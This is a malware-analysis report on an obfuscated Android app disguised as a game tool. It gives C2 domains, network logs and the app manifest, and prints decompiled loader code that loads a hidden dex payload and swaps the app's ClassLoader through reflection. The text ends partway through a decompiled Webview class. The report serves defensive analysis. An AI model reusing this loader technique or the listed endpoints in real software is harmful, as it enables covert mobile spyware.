# **Forensic Intelligence Report: [YGS-2026-01]**

**Subject:** Analysis of Obfuscated "PUBG Tool" Spyware

**Threat Category:** Trojanized Utility / Information Stealer

**Target Platform:** Android (ARMv8/ARMv7/x86)

**Security Level:** Confidential / Forensic Investigation

**Author:** Apich Organization Security Team

---

## **1. Executive Summary**

A detailed forensic investigation has been conducted on a malicious Android application masquerading as a game optimization utility ("PUBG Tool"). The application utilizes a **multi-stage, native-backed execution chain** to deploy a covert spying payload. The malware leverages social engineering (UE4 decoy assets), native-layer decryption, and runtime ClassLoader hijacking to bypass traditional static analysis and Play Protect heuristics.

## **2. Threat Infrastructure & Social Engineering**

The attacker employs several layers of deception to maintain a low profile on the victim's device:

### **2.1. The "Fake Front" (UE4 Decoy)**

The application package contains significant directory structures associated with **Unreal Engine 4 (UE4)**.

* **Purpose:** These assets serve no functional purpose for the malware's core logic. They are included to artificially inflate the APK size and mimic the file signature of high-performance mobile games, misleading both the user and automated scanners.

### **2.2. Command & Control (C2)**

* **Primary C2:** `http://www.bu84.com`
* **Exfiltration Endpoint:** `hy/x/config.php`
* **Status:** Operational. The server is configured to receive structured POST data, likely containing device metadata and captured media.

```text
Network Communication
HTTP requests
GET http://ht.bu84.com/hy/x/t2.txt
GET http://ht.bu84.com/hy/x/t2.txt 404
DNS Resolutions
docq.cn
ht.bu84.com
hyrjk.ftp.wtbusaym.site
downloads.blissroms.org
infinitedata-pa.googleapis.com
www.googleapis.com
IP Traffic

    TCP 47.89.9.97:80 (docq.cn)
    TCP 107.151.212.80:80 (hyrjk.ftp.wtbusaym.site)
    TCP 172.217.214.94:443
    TCP 192.178.129.138:443
    TCP 74.125.202.100:443
    TCP 172.67.151.52:443 (downloads.blissroms.org)
    TCP 104.21.64.137:443 (downloads.blissroms.org)
    TCP 74.125.202.106:443
    TCP 142.250.125.95:443 (www.googleapis.com)

JA3 Digests

    69659b6dfbeaa53c063d2002cfecab13
    893d25297c894da36fbdee5cea98b01c
    8f35687f7cd9ba7a693ccc31d712f6c0
    9b02ebd3a43b62d825e1ac605b621dc8
    aa50c12a5dfa717d9d6ab34e97de79d5

Memory Pattern Domains

    android.googlesource.com
    schemas.android.com

Memory Pattern Urls

    http://myserver/~pat/somebeans.jar
    http://schemas.android.com/aapt
    http://schemas.android.com/apk/res-auto
    http://schemas.android.com/apk/res/android
    http://schemas.android.com/apk/res/android77material_textinput_timepicker
    https://android.googlesource.com/toolchain/clang
    https://android.googlesource.com/toolchain/llvm

TLS
SNI: infinitedata-pa.googleapis.com
```

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android" android:compileSdkVersion="31" android:compileSdkVersionCodename="12" package="com.huage.p34445641" platformBuildVersionCode="31" platformBuildVersionName="12">
    <uses-permission android:name="i.app"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="i.app"/>
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
    <uses-permission android:name="i.app"/>
    <uses-permission android:name="android.permission.VIBRATE"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.MOUNT_UNMOUNT_FILESYSTEMS"/>
    <uses-feature android:name="i.app"/>
    <uses-feature android:name="i.app"/>
    <uses-feature android:name="i.app"/>
    <uses-feature android:name="i.app"/>
    <uses-permission android:name="i.app"/>
    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"/>
    <application android:allowBackup="false" android:appComponentFactory="androidx.core.app.CoreComponentFactory" android:hardwareAccelerated="true" android:icon="@mipmap/img_iapp" android:label="刷 刀 体 质" android:largeHeap="true" android:name="com.iapp.app.x5.APPAplication" android:networkSecurityConfig="@xml/network_config" android:requestLegacyExternalStorage="true" android:resizeableActivity="true" android:supportsRtl="true" android:theme="@style/AppBaseiAppTheme0" android:usesCleartextTraffic="true">
        <meta-data android:name="android.max_aspect" android:value="2.1"/>
        <activity android:name="com.iapp.app.logoActivity" android:theme="@style/logoAppTheme"/>
        <activity android:name="com.iapp.app.run.load" android:theme="@style/logoAppTheme"/>
        <activity android:configChanges="keyboardHidden|orientation|screenSize" android:exported="true" android:name="com.iapp.app.run.mian">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <activity android:configChanges="keyboardHidden|orientation|screenSize" android:name="com.iapp.app.run.main"/>
        <activity android:configChanges="keyboardHidden|orientation|screenSize" android:name="com.iapp.app.run.main2"/>
        <activity android:configChanges="keyboardHidden|orientation|screenSize" android:name="com.iapp.app.run.main3"/>
        <activity android:configChanges="keyboardHidden|orientation|screenSize" android:name="com.iapp.app.Webview"/>
        <activity android:configChanges="keyboardHidden|orientation|screenSize" android:name="com.iapp.app.Videoview"/>
        <activity android:name="com.iapp.app.DownList"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="cn.hugo.android.scanner.CaptureActivity" android:screenOrientation="portrait" android:theme="@android:style/Theme.NoTitleBar.Fullscreen" android:windowSoftInputMode="stateAlwaysHidden"/>
        <provider android:authorities="com.huage.p34445641.myFileProvider" android:exported="false" android:grantUriPermissions="true" android:name="androidx.core.content.FileProvider">
            <meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/file_provider"/>
        </provider>
        <meta-data android:name="i_app_logOutput" android:value="shi"/>
        <meta-data android:name="i_app_errLogOutput" android:value="shi"/>
    </application>
</manifest>
```

---

## **3. Technical Analysis of the Infection Chain**

### **3.1. Stage I: The Java Loader (`c.b.a.a.g`)**

The loader acts as the primary coordinator. Its main responsibilities include:

* **Environment Verification:** Checking for write permissions and SDK versioning to adapt file paths.
* **Logging:** Maintaining a local `log.txt` (observed in internal storage) to track execution success for the developer.
* **Dynamic Loading:** Invoking `DexClassLoader` to execute the decrypted payload stored in the `_RunDex_` directory.

```java
package c.b.a.a;

import android.app.Activity;
import android.content.Context;
import android.content.res.AssetFileDescriptor;
import android.content.res.AssetManager;
import android.database.sqlite.SQLiteDatabase;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.drawable.Drawable;
import android.media.MediaPlayer;
import android.os.Bundle;
import android.support.v4.media.session.PlaybackStateCompat;
import android.text.Html;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.CheckBox;
import android.widget.ImageView;
import android.widget.RadioButton;
import android.widget.TextView;
import androidx.vectordrawable.graphics.drawable.PathInterpolatorCompat;
import com.iapp.app.Aid_YuCodeX;
import com.iapp.app.run.mian;
import com.iapp.app.x5.APPAplication;
import com.iapp.app.z;
import dalvik.system.DexClassLoader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.lang.ref.SoftReference;
import java.lang.ref.WeakReference;
import java.lang.reflect.Field;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

/* loaded from: /home/pana/dev/jadx-1.5.3/20260120_source_apk/classes.dex */
public class g {
    public static int a = 2131231173;
    public static int b = 2131689499;

    /* renamed from: c, reason: collision with root package name */
    private static long f1347c;

    class a implements MediaPlayer.OnCompletionListener {
        a() {
        }

        @Override // android.media.MediaPlayer.OnCompletionListener
        public void onCompletion(MediaPlayer mediaPlayer) {
            mediaPlayer.release();
        }
    }

    public static void A(Context context, Object obj) throws Throwable {
        if (w.u == 0) {
            if (APPAplication.alt != null) {
                k.a(context, 1, String.valueOf(obj));
                return;
            }
            return;
        }
        if (w.m.length() > 6000) {
            w.m = w.m.substring(0, PathInterpolatorCompat.MAX_NUM_POINTS);
        }
        StringBuffer stringBuffer = new StringBuffer("[");
        stringBuffer.append(new SimpleDateFormat("HH:mm:ss:SSS").format(new Date()));
        stringBuffer.append("]  ");
        stringBuffer.append(obj);
        stringBuffer.append('\n');
        stringBuffer.append(w.m);
        w.m = stringBuffer.toString();
        String strValueOf = String.valueOf(obj);
        if (APPAplication.alt != null) {
            k.a(context, 1, strValueOf);
        }
        Log.v("ygs", strValueOf);
        if (w.u != 2 || context == null) {
            return;
        }
        long time = new Date().getTime();
        if (time - f1347c > 1000) {
            e.k(e.m(context) + "/iApp/Log/" + String.valueOf(com.iapp.app.a.f1934c) + ".log", w.m);
            f1347c = time;
        }
    }

    public static Bundle B(String str) {
        Bundle bundle = new Bundle();
        bundle.putString("OpenFilexmlui", str);
        return bundle;
    }

    public static String C(Context context, String str) {
        return com.iapp.app.b.h5(context, str.toLowerCase());
    }

    public static void D(Object obj, Context context, String str, Object obj2, int i2, Object obj3, Object obj4) {
        String lowerCase = str.toLowerCase();
        com.iapp.app.b.h4(context, lowerCase, obj instanceof Aid_YuCodeX ? lowerCase.endsWith(".iyu") ? new Object[]{obj, obj2, Integer.valueOf(i2), obj3, obj4, lowerCase.substring(0, lowerCase.length() - 4)} : new Object[]{obj, obj2, Integer.valueOf(i2), obj3, obj4, lowerCase} : new Object[]{obj, obj2, Integer.valueOf(i2), obj3, obj4});
    }

    public static void E(Context context, Activity activity, String str, String str2) throws Throwable {
        if (mian.sh) {
            new w(context, activity).d(str2);
            return;
        }
        Aid_YuCodeX aid_YuCodeX = new Aid_YuCodeX(context, activity);
        int iIndexOf = str.indexOf(46);
        mian.c(str.substring(0, iIndexOf), str.substring(iIndexOf + 1) + str2, aid_YuCodeX);
    }

    public static void F(Context context, Activity activity, String[] strArr, Object[] objArr, String str, String str2) throws Throwable {
        if (mian.sh) {
            w wVar = new w(context, activity);
            for (int i2 = 0; i2 < objArr.length; i2++) {
                wVar.S(strArr[i2].trim(), objArr[i2]);
            }
            wVar.d(str2);
            return;
        }
        Aid_YuCodeX aid_YuCodeX = new Aid_YuCodeX(context, activity);
        for (int i3 = 0; i3 < objArr.length; i3++) {
            aid_YuCodeX.dim(strArr[i3].trim(), objArr[i3]);
        }
        int iIndexOf = str.indexOf(46);
        mian.c(str.substring(0, iIndexOf), str.substring(iIndexOf + 1) + str2, aid_YuCodeX);
    }

    public static void G(Context context, String str) {
        com.iapp.app.b.h6(context, str.toLowerCase(), w.l);
    }

    public static String a(Context context, String str) {
        return com.iapp.app.b.h(context, str.toLowerCase());
    }

    public static Bitmap b(Context context, String str) {
        return str.startsWith("@") ? j.b(context, e.p(context, str)) : j.c(e.p(context, str));
    }

    public static Bitmap c(Context context, String str) {
        InputStream inputStreamOpen;
        long jAvailable;
        boolean z;
        Bitmap bitmapDecodeStream = null;
        if (str == null) {
            return null;
        }
        String strP = e.p(context, str);
        if (str.startsWith("@")) {
            try {
                inputStreamOpen = context.getAssets().open(strP);
                jAvailable = inputStreamOpen.available();
                z = true;
            } catch (IOException e) {
                e.printStackTrace();
                return null;
            }
        } else {
            File file = new File(strP);
            if (!file.exists()) {
                return null;
            }
            jAvailable = file.length();
            inputStreamOpen = null;
            z = false;
        }
        BitmapFactory.Options options = new BitmapFactory.Options();
        options.inJustDecodeBounds = true;
        options.inSampleSize = jAvailable >= 67584 ? jAvailable < 204800 ? 2 : jAvailable < 512000 ? 3 : jAvailable < PlaybackStateCompat.ACTION_SET_CAPTIONING_ENABLED ? 5 : 10 : 1;
        options.inDensity = 120;
        options.inPreferredConfig = Bitmap.Config.RGB_565;
        options.inJustDecodeBounds = false;
        try {
            bitmapDecodeStream = z ? BitmapFactory.decodeStream(inputStreamOpen, null, options) : BitmapFactory.decodeFile(strP, options);
        } catch (Throwable unused) {
        }
        if (inputStreamOpen != null) {
            try {
                inputStreamOpen.close();
            } catch (Exception e2) {
                e2.printStackTrace();
            }
        }
        return bitmapDecodeStream;
    }

    public static boolean d(Context context, MediaPlayer mediaPlayer, String str) {
        try {
            if (r.v(str.toLowerCase())) {
                mediaPlayer.setDataSource(str);
            } else if (str.startsWith("@")) {
                AssetFileDescriptor assetFileDescriptorOpenFd = context.getAssets().openFd(o(context, str));
                mediaPlayer.setDataSource(assetFileDescriptorOpenFd.getFileDescriptor(), assetFileDescriptorOpenFd.getStartOffset(), assetFileDescriptorOpenFd.getLength());
            } else {
                File file = new File(o(context, str));
                if (!file.exists()) {
                    return false;
                }
                mediaPlayer.setDataSource(file.getPath());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        try {
            mediaPlayer.prepare();
        } catch (IOException e2) {
            e2.printStackTrace();
        } catch (IllegalStateException e3) {
            e3.printStackTrace();
        }
        mediaPlayer.start();
        mediaPlayer.setOnCompletionListener(new a());
        return true;
    }

    public static String e(Context context, String str) {
        return com.iapp.app.b.h(context, str.toLowerCase());
    }

    public static boolean f(Context context, String str, String str2, boolean z) {
        boolean zStartsWith = str.startsWith("@");
        String strO = o(context, str);
        return zStartsWith ? e.e(context, strO, o(context, str2), z) : e.a(strO, o(context, str2), Boolean.valueOf(z));
    }

    public static boolean g(Context context, String str) throws IOException {
        if (!str.startsWith("@")) {
            return new File(o(context, str)).exists();
        }
        try {
            context.getAssets().open(o(context, str)).close();
            return true;
        } catch (IOException e) {
            e.printStackTrace();
            return false;
        }
    }

    public static String[] h(Context context, String str) {
        if (str.startsWith("@")) {
            try {
                return context.getAssets().list(o(context, str));
            } catch (IOException e) {
                e.printStackTrace();
                return null;
            }
        }
        File file = new File(o(context, str));
        if (file.exists()) {
            return file.list();
        }
        return null;
    }

    public static String i(Context context, String str) {
        return str.startsWith("@") ? e.f(context, o(context, str)) : e.h(o(context, str));
    }

    public static String j(Context context, String str, String str2) {
        return str.startsWith("@") ? e.g(context, o(context, str), str2) : e.i(o(context, str), str2);
    }

    public static long k(Context context, String str) throws IOException {
        if (!str.startsWith("@")) {
            File file = new File(o(context, str));
            if (file.exists()) {
                return file.length();
            }
            return -1L;
        }
        int iAvailable = -1;
        try {
            InputStream inputStreamOpen = context.getAssets().open(o(context, str));
            iAvailable = inputStreamOpen.available();
            inputStreamOpen.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return iAvailable;
    }

    public static int l(Context context, String str, String str2, String str3, boolean z) {
        return str.startsWith("@") ? d.e(context.getAssets().open(o(context, str)), str2, str3, z) : d.f(o(context, str), str2, str3, z);
    }

    public static void m(Context context, String str, String str2, boolean z) {
        if (str.startsWith("@")) {
            d.g(context.getAssets().open(o(context, str)), str2, z);
        } else {
            d.h(o(context, str), str2, z);
        }
    }

    public static Object n(String str, Object[] objArr) {
        return b.h(null, z.class, str, objArr);
    }

    public static String o(Context context, String str) {
        return e.p(context, str);
    }

    public static View p(Context context, String str) {
        AssetManager assets = context.getResources().getAssets();
        try {
            return LayoutInflater.from(context).inflate(assets.openXmlResourceParser("assets/res/" + str), (ViewGroup) null);
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    public static void q(Object obj, Context context, String str, Object obj2, int i2, Object obj3, Object obj4, Object obj5, Object obj6) {
        com.iapp.app.b.h4(context, str.toLowerCase(), new Object[]{obj, obj2, Integer.valueOf(i2), obj3, obj4, obj5, obj6});
    }

    public static DexClassLoader r(Context context, String str, ClassLoader classLoader) {
        String str2 = com.iapp.app.a.a(context) + "_RunDex";
        String str3 = com.iapp.app.a.a(context) + "_RunDex_";
        e.b(str2, true);
        e.b(str3, true);
        byte[] bArrW = e.w(context.getClassLoader().getResourceAsStream("lib/" + str));
        File file = new File(str3 + "/" + str);
        if (file.exists() && !r.e(bArrW).equals(r.e(e.v(file)))) {
            file.delete();
        }
        if (!file.exists()) {
            e.j(str3 + "/" + str, bArrW);
        }
        return new DexClassLoader(str3 + "/" + str, str2, null, classLoader);
    }

    public static void s(String str) {
        System.loadLibrary(str);
    }

    public static byte[] t(Context context, String str) {
        return str.startsWith("@") ? e.u(context, o(context, str)) : e.x(o(context, str));
    }

    public static void u(Context context, DexClassLoader dexClassLoader) {
        try {
            Class<?> cls = Class.forName("android.app.ActivityThread");
            Class<?> cls2 = Class.forName("android.app.LoadedApk");
            Object objInvoke = cls.getMethod("currentActivityThread", new Class[0]).invoke(null, new Object[0]);
            Field declaredField = cls.getDeclaredField("mPackages");
            declaredField.setAccessible(true);
            WeakReference weakReference = (WeakReference) ((Map) declaredField.get(objInvoke)).get(context.getPackageName());
            Field declaredField2 = cls2.getDeclaredField("mClassLoader");
            declaredField2.setAccessible(true);
            declaredField2.set(weakReference.get(), dexClassLoader);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static Bitmap v(Context context, String str) {
        return str.startsWith("@") ? j.b(context, o(context, str)) : j.c(o(context, str));
    }

    public static void w(View view, Object obj, HashMap<Integer, Object> map, i iVar) {
        Boolean bool = Boolean.TRUE;
        if (view == null) {
            return;
        }
        Object[] objArr = (Object[]) view.getTag();
        objArr[3] = map;
        view.setTag(objArr);
        if (obj == null) {
            if (view instanceof RadioButton) {
                ((RadioButton) view).setText("");
                return;
            }
            if (view instanceof CheckBox) {
                ((CheckBox) view).setText("");
                return;
            } else if (view instanceof TextView) {
                ((TextView) view).setText("");
                return;
            } else {
                if (view instanceof ImageView) {
                    ((ImageView) view).setImageDrawable(null);
                    return;
                }
                return;
            }
        }
        if (view instanceof RadioButton) {
            if (obj instanceof Boolean) {
                ((RadioButton) view).setChecked(obj.equals(bool));
                return;
            }
            String strValueOf = String.valueOf(obj);
            boolean zStartsWith = strValueOf.startsWith("(html)");
            RadioButton radioButton = (RadioButton) view;
            CharSequence charSequenceFromHtml = strValueOf;
            if (zStartsWith) {
                charSequenceFromHtml = Html.fromHtml(strValueOf.substring(6));
            }
            radioButton.setText(charSequenceFromHtml);
            return;
        }
        if (view instanceof CheckBox) {
            if (obj instanceof Boolean) {
                ((CheckBox) view).setChecked(obj.equals(bool));
                return;
            }
            String strValueOf2 = String.valueOf(obj);
            boolean zStartsWith2 = strValueOf2.startsWith("(html)");
            CheckBox checkBox = (CheckBox) view;
            CharSequence charSequenceFromHtml2 = strValueOf2;
            if (zStartsWith2) {
                charSequenceFromHtml2 = Html.fromHtml(strValueOf2.substring(6));
            }
            checkBox.setText(charSequenceFromHtml2);
            return;
        }
        if (view instanceof TextView) {
            String strValueOf3 = String.valueOf(obj);
            boolean zStartsWith3 = strValueOf3.startsWith("(html)");
            TextView textView = (TextView) view;
            CharSequence charSequenceFromHtml3 = strValueOf3;
            if (zStartsWith3) {
                charSequenceFromHtml3 = Html.fromHtml(strValueOf3.substring(6));
            }
            textView.setText(charSequenceFromHtml3);
            return;
        }
        if (view instanceof ImageView) {
            if (obj instanceof Bitmap) {
                ((ImageView) view).setImageBitmap((Bitmap) obj);
                return;
            }
            if (obj instanceof Drawable) {
                ((ImageView) view).setImageDrawable((Drawable) obj);
                return;
            }
            if (iVar == null) {
                ((ImageView) view).setImageBitmap(b(view.getContext(), String.valueOf(obj)));
                return;
            }
            ImageView imageView = (ImageView) view;
            String string = obj.toString();
            String lowerCase = string.toLowerCase();
            SoftReference<Drawable> softReference = iVar.b.get(lowerCase);
            Drawable drawable = softReference != null ? softReference.get() : null;
            if (drawable != null) {
                imageView.setImageDrawable(drawable);
            } else if (lowerCase.startsWith("http:") || lowerCase.startsWith("https:") || lowerCase.startsWith("ftp:")) {
                iVar.s(imageView, string, lowerCase, true);
            } else {
                iVar.p(imageView, string, lowerCase, true);
            }
        }
    }

    public static boolean x(Context context, String str, boolean z) {
        return p.c(context, str, z);
    }

    public static boolean y(Context context, String str, boolean z) {
        return p.f(context, str, z);
    }

    public static SQLiteDatabase z(Context context, String str, boolean z) {
        return p.g(context, str, z);
    }
}
```

### **3.2. Stage II: Native Decryption (`libygsiyu.so`)**

Static analysis of the native layer reveals a sophisticated decryption engine written in C++ (Clang/LLVM).

* **The "Silly Key" (`slky`) Algorithm:** The library exports a function `iapp::slky`, a custom stream cipher used to decrypt `assets/lib.so`.
* **JNI Bridge:** Functions such as `Java_com_iapp_app_b_h` act as the interface, allowing Java to trigger high-speed native decryption while keeping the decryption key hidden from Java-based decompilers.

### **3.3. Stage III: Memory Hijacking & Execution**

The malware employs a "Hot-Swap" technique via Method `u()`:

* **ActivityThread Manipulation:** Using Java Reflection, the malware accesses the `mPackages` field of the current `ActivityThread`.
* **ClassLoader Replacement:** It replaces the legitimate `mClassLoader` with its own `DexClassLoader`. This effectively "re-boots" the app's logic in memory, replacing the PUBG Tool UI with the malicious spying engine without an external process change.

```java
package com.iapp.app;

import android.R;
import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.Activity;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.net.Uri;
import android.net.http.SslError;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.provider.MediaStore;
import android.view.KeyEvent;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.animation.RotateAnimation;
import android.webkit.CookieManager;
import android.webkit.CookieSyncManager;
import android.webkit.DownloadListener;
import android.webkit.JsPromptResult;
import android.webkit.JsResult;
import android.webkit.SslErrorHandler;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebStorage;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.EditText;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.Toast;
import androidx.appcompat.app.ActionBar;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.Toolbar;
import androidx.core.view.ViewCompat;
import java.io.File;
import java.io.FileNotFoundException;

/* loaded from: /home/pana/dev/jadx-1.5.3/20260120_source_apk/classes.dex */
public class Webview extends AppCompatActivity {
    private WebView b;
    private ImageView e;
    private Toolbar f;
    private FrameLayout g;
    private int h;

    /* renamed from: i, reason: collision with root package name */
    private WebChromeClient.CustomViewCallback f1933i;
    private String j;
    private String a = null;

    /* renamed from: c, reason: collision with root package name */
    private String f1931c = null;

    /* renamed from: d, reason: collision with root package name */
    private RotateAnimation f1932d = null;
    private ValueCallback<Uri> k = null;
    private ValueCallback<Uri[]> l = null;
    public String urlXX = null;
    public String userAgentXX = null;
    public String contentDispositionXX = null;
    public String mimetypeXX = null;
    public String uid = null;
    public long contentLengthXX = 0;
    public int chongzhi_i = 0;
    public int chongzhi_q = 0;
    public String chongzhi_type = null;
    public String chongzhi_id = null;
    private Handler m = new e();

    public class a implements DownloadListener {
        public a() {
        }

        @Override // android.webkit.DownloadListener
        public void onDownloadStart(String str, String str2, String str3, String str4, long j) {
            String lowerCase = str4.toLowerCase();
            String strC = str3 != null ? c.b.a.a.r.c(str3, "filename=\"", "\"") : null;
            if (strC == null) {
                if (str.contains("?")) {
                    str = str.substring(0, str.indexOf(63));
                }
                strC = c.b.a.a.r.b(str);
                String lowerCase2 = strC.toLowerCase();
                if (lowerCase.equals("application/vnd.android.package-archive") && !lowerCase2.endsWith(".apk")) {
                    strC = strC + ".apk";
                }
            }
            if (strC != null) {
                Toast.makeText(Webview.this, "开始下载 " + strC, 1).show();
                com.iapp.app.a.b.d(str, strC, null);
            }
            if (Webview.this.f1931c == null) {
                Webview.this.finish();
            }
        }
    }

    class b implements DialogInterface.OnClickListener {
        final /* synthetic */ JsPromptResult a;

        b(Webview webview, JsPromptResult jsPromptResult) {
            this.a = jsPromptResult;
        }

        @Override // android.content.DialogInterface.OnClickListener
        public void onClick(DialogInterface dialogInterface, int i2) {
            this.a.cancel();
        }
    }

    class c implements DialogInterface.OnClickListener {
        final /* synthetic */ JsPromptResult a;
        final /* synthetic */ EditText b;

        c(Webview webview, JsPromptResult jsPromptResult, EditText editText) {
            this.a = jsPromptResult;
            this.b = editText;
        }

        @Override // android.content.DialogInterface.OnClickListener
        public void onClick(DialogInterface dialogInterface, int i2) {
            this.a.confirm(this.b.getText().toString());
        }
    }

    class d extends Thread {
        final /* synthetic */ String a;

        d(String str) {
            this.a = str;
        }

        @Override // java.lang.Thread, java.lang.Runnable
        public void run() {
            String str = c.b.a.a.e.m(Webview.this) + "/img/" + c.b.a.a.r.b(this.a);
            try {
                if (c.b.a.a.h.a(this.a, str, true) != -1) {
                    Webview.this.j = str;
                    Webview.this.a("已保存至:" + str);
                    Webview.saveImageToGallery(Webview.this, new File(str));
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    class e extends Handler {
        e() {
        }

        @Override // android.os.Handler
        public void handleMessage(Message message) {
            ImageView imageView;
            int i2;
            int i3 = message.what;
            if (i3 == 1) {
                Toast.makeText(Webview.this, message.obj.toString(), 1).show();
                return;
            }
            if (i3 == 2) {
                imageView = Webview.this.e;
                i2 = 8;
            } else {
                if (i3 != 3) {
                    return;
                }
                imageView = Webview.this.e;
                i2 = 0;
            }
            imageView.setVisibility(i2);
        }
    }

    class f implements View.OnClickListener {
        f() {
        }

        @Override // android.view.View.OnClickListener
        public void onClick(View view) {
            if (Webview.this.b.canGoBack()) {
                Webview.this.b.goBack();
            } else {
                Webview.this.finish();
            }
        }
    }

    class g extends WebChromeClient {
        g() {
        }

        @Override // android.webkit.WebChromeClient
        public void onExceededDatabaseQuota(String str, String str2, long j, long j2, long j3, WebStorage.QuotaUpdater quotaUpdater) {
            quotaUpdater.updateQuota(j2 * 2);
        }

        @Override // android.webkit.WebChromeClient
        public void onHideCustomView() {
            Webview.this.onHideCustomViewX();
        }

        @Override // android.webkit.WebChromeClient
        public boolean onJsAlert(WebView webView, String str, String str2, JsResult jsResult) {
            return Webview.this.t(webView, str, str2, jsResult);
        }

        @Override // android.webkit.WebChromeClient
        public boolean onJsConfirm(WebView webView, String str, String str2, JsResult jsResult) {
            return Webview.this.u(webView, str, str2, jsResult);
        }

        @Override // android.webkit.WebChromeClient
        public boolean onJsPrompt(WebView webView, String str, String str2, String str3, JsPromptResult jsPromptResult) {
            return Webview.this.v(webView, str, str2, str3, jsPromptResult);
        }

        @Override // android.webkit.WebChromeClient
        public void onProgressChanged(WebView webView, int i2) {
            String title = webView.getTitle();
            if (i2 == 100) {
                Webview.this.f1931c = title;
                Webview.this.f.setTitle(title);
                Webview.this.e.clearAnimation();
                Webview.this.e.setVisibility(8);
                return;
            }
            if (title != null) {
                if (title.length() > 16) {
                    title = title.substring(0, 15);
                }
                Webview.this.f.setTitle("[" + i2 + "%] " + title + "..");
            }
        }

        public void onReachedMaxAppCacheSize(long j, long j2, WebStorage.QuotaUpdater quotaUpdater) {
            quotaUpdater.updateQuota(j * 2);
        }

        @Override // android.webkit.WebChromeClient
        public void onShowCustomView(View view, WebChromeClient.CustomViewCallback customViewCallback) {
            Context context = Webview.this.b.getContext();
            if (context instanceof Activity) {
                Webview.this.onShowCustomViewX((Activity) context, view, customViewCallback);
            }
        }

        @Override // android.webkit.WebChromeClient
        @SuppressLint({"NewApi"})
        public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> valueCallback, WebChromeClient.FileChooserParams fileChooserParams) {
            if (Webview.this.l != null) {
                return true;
            }
            Webview.this.l = valueCallback;
            Intent intent = new Intent("android.intent.action.GET_CONTENT");
            intent.addCategory("android.intent.category.OPENABLE");
            intent.setType("*/*");
            Webview.this.startActivityForResult(Intent.createChooser(intent, "File Chooser"), 1);
            return true;
        }
    }

    class h extends WebViewClient {
        h() {
        }

        @Override // android.webkit.WebViewClient
        public void onPageFinished(WebView webView, String str) {
            super.onPageFinished(webView, str);
        }

        @Override // android.webkit.WebViewClient
        public void onPageStarted(WebView webView, String str, Bitmap bitmap) {
            super.onPageStarted(webView, str, bitmap);
        }

        @Override // android.webkit.WebViewClient
        public void onReceivedSslError(WebView webView, SslErrorHandler sslErrorHandler, SslError sslError) {
            com.iapp.app.x5.WebView.a(webView.getContext(), sslErrorHandler, sslError.getUrl());
        }

        @Override // android.webkit.WebViewClient
        public boolean shouldOverrideUrlLoading(WebView webView, String str) {
            String lowerCase = str.toLowerCase();
            if (str.endsWith("DYBJLLQ")) {
                Webview.this.r(str);
                return true;
            }
            if (c.b.a.a.r.v(lowerCase)) {
                Webview.this.loadurl(webView, str);
            } else if (lowerCase.startsWith("iappcopy://")) {
                c.b.a.a.r.k(str.substring(11), Webview.this);
                Toast.makeText(Webview.this, "已复制", 1).show();
            } else if (lowerCase.startsWith("iappoay://iapp.yx93.com:")) {
                Webview.this.s("http://" + str.substring(10));
            } else if (lowerCase.startsWith("iappopenapp://")) {
                c.b.a.a.e.s(Webview.this, str.substring(14));
            } else {
                try {
                    Webview.this.startActivity(new Intent("android.intent.action.VIEW", c.b.a.a.m.c(Webview.this, str)));
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            return true;
        }
    }

    class i implements DialogInterface.OnCancelListener {
        final /* synthetic */ JsResult a;

        i(Webview webview, JsResult jsResult) {
            this.a = jsResult;
        }

        @Override // android.content.DialogInterface.OnCancelListener
        public void onCancel(DialogInterface dialogInterface) {
            this.a.confirm();
        }
    }

    class j implements DialogInterface.OnClickListener {
        final /* synthetic */ JsResult a;

        j(Webview webview, JsResult jsResult) {
            this.a = jsResult;
        }

        @Override // android.content.DialogInterface.OnClickListener
        public void onClick(DialogInterface dialogInterface, int i2) {
            this.a.confirm();
        }
    }

    class k implements DialogInterface.OnCancelListener {
        final /* synthetic */ JsResult a;

        k(Webview webview, JsResult jsResult) {
            this.a = jsResult;
        }

        @Override // android.content.DialogInterface.OnCancelListener
        public void onCancel(DialogInterface dialogInterface) {
            this.a.cancel();
        }
    }

    class l implements DialogInterface.OnClickListener {
        final /* synthetic */ JsResult a;

        l(Webview webview, JsResult jsResult) {
            this.a = jsResult;
        }

        @Override // android.content.DialogInterface.OnClickListener
